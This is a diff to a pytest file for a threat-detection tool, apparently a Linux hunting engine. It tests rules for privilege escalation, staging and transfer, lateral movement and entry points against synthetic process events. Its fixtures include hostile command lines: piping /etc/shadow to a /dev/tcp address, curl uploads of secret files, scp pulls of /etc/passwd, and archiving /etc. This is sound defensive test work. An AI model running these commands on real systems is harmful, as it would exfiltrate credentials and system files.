@@ -24,6 +24,7 @@ from romulus.evidence.typed import Outcome, RawRef, TypedEvent, fv
 from romulus.hunt.context import evaluate_context
 from romulus.hunt.expansion import ExpansionEngine
 from romulus.hunt.links import LinkResult
+from romulus.hunt.publish import publish_match
 from romulus.sources.models import Window
 from romulus.store.db import make_engine, migrate
 from romulus.store.repo import Repo
@@ -193,32 +194,64 @@ def test_privilege_probing_rejects_child_flags_and_plain_find(argv, executable):
     assert one(PrivilegeProbing, [exec_event("b", argv, executable=executable)]) == []
 
 
-def test_privilege_escalation_unbrokered_euid0_is_high_with_provenance():
-    gained = exec_event("g", ["bash"], executable="/bin/bash", process__euid="0", process__auid="1000")
-    match = one(PrivilegeProbing, [gained])
-    assert len(match) == 1 and {"T1548", "T1068"} <= set(match[0].notes)
-    assert match[0].proposed_lane == "high" and "auid=1000" in match[0].claim and "euid=0" in match[0].claim
-    fields = {p.field for p in match[0].predicate}
-    assert "process.euid" in fields and "process.auid" in fields
+def _root_chain():
+    """A non-root login shell (pid 100) under which later root records are spawned."""
+    return exec_event("sh", ["bash"], executable="/bin/bash", process__uid="1000", process__euid="1000",
+                      process__auid="1000", process__pid=100, process__ppid=50, ts=T0)
 
 
-def test_privilege_escalation_brokered_euid0_is_lead():
-    broker = exec_event("s", ["sudo", "-s"], executable="/usr/bin/sudo", ts=T0,
-                        process__euid="0", process__auid="1000")
-    child = exec_event("c", ["id"], executable="/usr/bin/id", ts=T0 + timedelta(seconds=5),
-                       process__euid="0", process__auid="1000")
-    matches = [m for m in one(PrivilegeProbing, [broker, child]) if "euid0" in m.group_key]
-    assert len(matches) == 1 and matches[0].proposed_lane == "lead"
+def test_privilege_escalation_unbrokered_root_transition_is_high_with_provenance():
+    shell = _root_chain()
+    root = exec_event("x", ["/tmp/x/exploit"], executable="/tmp/x/exploit", process__uid="0", process__euid="0",
+                      process__auid="1000", process__pid=200, process__ppid=100, ts=T0 + timedelta(seconds=3))
+    matches = [m for m in one(PrivilegeProbing, [shell, root]) if "euid0" in m.group_key]
+    assert len(matches) == 1 and {"T1548", "T1068"} <= set(matches[0].notes)
+    assert matches[0].proposed_lane == "high" and "auid=1000" in matches[0].claim and "uid=0" in matches[0].claim
+    fields = {p.field for p in matches[0].predicate}
+    assert "process.uid" in fields and "process.auid" in fields
 
 
-@pytest.mark.parametrize("euid,auid", [("0", "0"), (None, "1000")])
-def test_privilege_escalation_benign_root_identities(euid, auid):
-    fields = {}
+def test_privilege_escalation_brokered_root_transition_is_lead():
+    shell = _root_chain()
+    sudo = exec_event("su", ["sudo", "-s"], executable="/usr/bin/sudo", process__uid="1000", process__euid="0",
+                      process__auid="1000", process__pid=150, process__ppid=100, ts=T0 + timedelta(seconds=1))
+    root_shell = exec_event("rs", ["bash"], executable="/bin/bash", process__uid="0", process__euid="0",
+                            process__auid="1000", process__pid=160, process__ppid=150, ts=T0 + timedelta(seconds=2))
+    matches = [m for m in one(PrivilegeProbing, [shell, sudo, root_shell]) if "euid0" in m.group_key]
+    assert len(matches) == 1 and matches[0].proposed_lane == "lead" and "brokered" in matches[0].claim
+    assert "T1068" not in matches[0].notes
+
+
+def test_privilege_escalation_later_unbrokered_root_after_sudo_is_its_own_high_finding():
+    shell = _root_chain()
+    sudo = exec_event("su", ["sudo", "apt", "update"], executable="/usr/bin/sudo", process__uid="1000",
+                      process__euid="0", process__auid="1000", process__pid=150, process__ppid=100,
+                      ts=T0 + timedelta(seconds=1))
+    sudo_root = exec_event("sr", ["apt", "update"], executable="/usr/bin/apt", process__uid="0", process__euid="0",
+                           process__auid="1000", process__pid=160, process__ppid=150, ts=T0 + timedelta(seconds=2))
+    exploit = exec_event("ex", ["/tmp/x/exploit"], executable="/tmp/x/exploit", process__uid="0",
+                         process__euid="0", process__auid="1000", process__pid=300, process__ppid=100,
+                         ts=T0 + timedelta(hours=1))
+    euid0 = [m for m in one(PrivilegeProbing, [shell, sudo, sudo_root, exploit]) if "euid0" in m.group_key]
+    assert len(euid0) == 2
+    high = [m for m in euid0 if m.proposed_lane == "high"]
+    assert len(high) == 1 and "exploit" in high[0].claim and "T1068" in high[0].notes
+
+
+def test_setuid_euid_only_elevation_is_lead_without_t1068():
+    passwd = exec_event("p", ["passwd"], executable="/usr/bin/passwd", process__uid="1000", process__euid="0",
+                        process__auid="1000", process__pid=120, process__ppid=100)
+    matches = [m for m in one(PrivilegeProbing, [passwd]) if "setuid" in m.group_key]
+    assert len(matches) == 1 and matches[0].proposed_lane == "lead" and matches[0].notes == ["T1548"]
+
+
+@pytest.mark.parametrize("uid,euid,auid", [("0", "0", "0"), ("1000", None, "1000")])
+def test_privilege_escalation_benign_root_identities(uid, euid, auid):
+    fields = {"process__uid": uid, "process__auid": auid, "process__pid": 120, "process__ppid": 100}
     if euid is not None:
         fields["process__euid"] = euid
-    fields["process__auid"] = auid
     out = [m for m in one(PrivilegeProbing, [exec_event("b", ["id"], executable="/usr/bin/id", **fields)])
-           if "euid0" in m.group_key]
+           if "euid0" in m.group_key or "setuid" in m.group_key]
     assert out == []
 
 
@@ -439,3 +472,123 @@ def test_expansion_engine_publishes_high_lateral_finding():
     lateral = [c for c in repo.candidates("he") if c["rule_id"] == "context.lateral_movement"]
     assert any(c["lane"] == "high" and "10.0.0.9:22" in c["claim"] for c in lateral)
     assert all(c["source_anchor_id"] == "F-anchor" for c in lateral)
+
+
+# ------------------------------------------------------------------------------------------------
+# Citations vs claims, parse failures, per-tool grammars, and lateral target/lineage matching.
+# ------------------------------------------------------------------------------------------------
+
+def test_discovery_cites_every_record_and_claim_total_matches():
+    events = [exec_event(f"d{i}", ["cat", "/etc/hosts"], executable="/usr/bin/cat", ts=T0 + timedelta(seconds=i))
+              for i in range(15)]
+    match = one(PostAccessDiscovery, events)[0]
+    cited = [e for e in match.events if e.id.startswith("d")]
+    assert len(cited) == 15 and "15 command(s)" in match.claim
+    assert len([p for p in match.predicate if p.field == "process.executable"]) == 15
+
+
+def test_merge_from_wider_window_rebuilds_claim_to_the_union():
+    repo = _repo()
+    narrow = [exec_event(f"n{i}", ["ss", "-tunap"], executable="/usr/bin/ss", ts=T0 + timedelta(seconds=i))
+              for i in range(3)]
+    wide = narrow + [exec_event(f"w{i}", ["ss", "-tunap"], executable="/usr/bin/ss",
+                                ts=T0 + timedelta(seconds=10 + i)) for i in range(12)]
+    first = PostAccessDiscovery().consume_linked(anchor(), link(), narrow)[0]
+    publish_match(repo, "h1", PostAccessDiscovery(), first, None, {}, source_anchor_id="F-anchor",
+                  source_link_id="L1", context_reach={"anchor_id": "F-anchor", "link_id": "L1",
+                                                      "link_type": "process_lineage", "strength": "observed"})
+    wider = PostAccessDiscovery().consume_linked(anchor(), link(), wide)[0]
+    publish_match(repo, "h1", PostAccessDiscovery(), wider, None, {}, source_anchor_id="F-anchor",
+                  source_link_id="L2", context_reach={"anchor_id": "F-anchor", "link_id": "L2",
+                                                      "link_type": "process_lineage", "strength": "observed"})
+    candidates = [c for c in repo.candidates("h1") if c["rule_id"] == "context.post_access_discovery"]
+    assert len(candidates) == 1
+    assert "15 command(s)" in candidates[0]["claim"]
+    assert len([e for e in candidates[0]["event_ids"] if e.startswith(("n", "w"))]) == 15
+
+
+def test_unparseable_shell_c_script_counts_as_partial():
+    broken = exec_event("b", ["bash", "-c", "cat /etc/shadow > /dev/tcp/1.2.3.4/80 2>&1"],
+                        executable="/bin/bash")
+    repo = _repo()
+    evaluate_context(repo, "h1", anchor(), link(), [broken])
+    cell = _cell(repo, "context.staging_and_transfer")
+    assert cell["detail"]["missing_required"] >= 1 and cell["state"] != "no_match_complete"
+
+
+def test_staging_inbound_devtcp_is_ingress_not_transfer():
+    inbound = exec_event("i", ["bash", "-c", "cat < /dev/tcp/10.0.0.9/80"], executable="/bin/bash")
+    match = one(StagingAndTransfer, [inbound])[0]
+    assert "T1105" in match.notes and "T1048" not in match.notes and "reads from" in match.claim
+
+
+@pytest.mark.parametrize("argv,is_upload", [
+    (["curl", "-d", "email=a@b.com", "http://x.test/f"], False),
+    (["curl", "--data-raw", "a@b", "http://x.test/f"], False),
+    (["curl", "-d", "@/tmp/secret", "http://x.test/f"], True),
+    (["curl", "-F", "a=b", "http://x.test/f"], False),
+    (["curl", "-F", "file=@/tmp/secret", "http://x.test/f"], True),
+])
+def test_curl_file_upload_grammar(argv, is_upload):
+    match = one(StagingAndTransfer, [exec_event("c", argv, executable="/usr/bin/curl")])
+    assert bool(match) == is_upload
+
+
+def test_scp_push_is_transfer_but_pull_is_ingress():
+    push = one(StagingAndTransfer, [exec_event("p", ["scp", "/tmp/a", "user@10.0.0.9:/tmp/"],
+                                              executable="/usr/bin/scp")])[0]
+    assert "T1021.004" in push.notes and "outbound" in push.claim
+    pull = one(StagingAndTransfer, [exec_event("q", ["scp", "user@10.0.0.9:/etc/passwd", "/tmp/"],
+                                              executable="/usr/bin/scp")])[0]
+    assert "T1105" in pull.notes and "inbound" in pull.claim and pull.proposed_lane == "lead"
+
+
+def test_zip_recursive_and_tar_chdir_inputs_are_staged():
+    zipped = one(StagingAndTransfer, [exec_event("z", ["zip", "-r", "/tmp/out.zip", "/etc"],
+                                                executable="/usr/bin/zip")])[0]
+    assert "T1560.001" in zipped.notes
+    tarred = one(StagingAndTransfer, [exec_event("t", ["tar", "czf", "/tmp/o.tgz", "-C", "/", "etc"],
+                                                executable="/bin/tar", process__cwd="/tmp")])[0]
+    assert "T1560.001" in tarred.notes and "/etc" in tarred.claim
+
+
+def test_lateral_cross_target_connect_stays_lead():
+    client = exec_event("cl", ["ssh", "10.0.0.9"], executable="/usr/bin/ssh", process__pid=100, ts=T0)
+    connect = socket_event("sk", "10.0.0.8", 22, ts=T0 + timedelta(seconds=2))
+    connect = connect.model_copy(update={"fields": {**connect.fields, "process.pid": fv(900, "sk:pid"),
+                                                    "process.ppid": fv(800, "sk:ppid")}})
+    both = one(LateralMovement, [client, connect])
+    socket_group = [m for m in both if "addr:10.0.0.8:22" in m.group_key]
+    assert socket_group and socket_group[0].proposed_lane == "lead" and "temporal" in socket_group[0].claim
+
+
+def test_lateral_connect_matched_by_process_lineage_is_high():
+    client = exec_event("cl", ["ssh", "jump"], executable="/usr/bin/ssh", process__pid=100, ts=T0)
+    connect = socket_event("sk", "10.0.0.9", 22, ts=T0 + timedelta(seconds=2))
+    connect = connect.model_copy(update={"fields": {**connect.fields, "process.pid": fv(101, "sk:pid"),
+                                                    "process.ppid": fv(100, "sk:ppid")}})
+    both = one(LateralMovement, [client, connect])
+    high = [m for m in both if "addr:10.0.0.9:22" in m.group_key]
+    assert high and high[0].proposed_lane == "high"
+
+
+@pytest.mark.parametrize("source,expect", [
+    ("203.0.113.8", "high"), (None, "lead")])
+def test_entry_point_external_high_sourceless_lead(source, expect):
+    from romulus.detect.context import EntryPointPromotion
+    login = auth_event("lg", source=source, phase="login")
+    link_ = ContextLink(id="L", link_type="login_session", strength="observed",
+                        key={"process.session_id": 42}, evidence_events=[], status="complete")
+    match = EntryPointPromotion().consume_linked(anchor("credential_access"), link_, [login])
+    assert len(match) == 1 and match[0].proposed_lane == expect
+    if source is None:
+        assert "not confirmed external" in match[0].claim
+
+
+def test_entry_point_internal_source_not_promoted():
+    from romulus.detect.context import EntryPointPromotion
+    internal = auth_event("in", source="10.0.0.8", phase="login")
+    sourceless = auth_event("so", source=None, phase="session_open")
+    link_ = ContextLink(id="L", link_type="login_session", strength="observed",
+                        key={"process.session_id": 42}, evidence_events=[], status="complete")
+    assert EntryPointPromotion().consume_linked(anchor("credential_access"), link_, [internal, sourceless]) == []
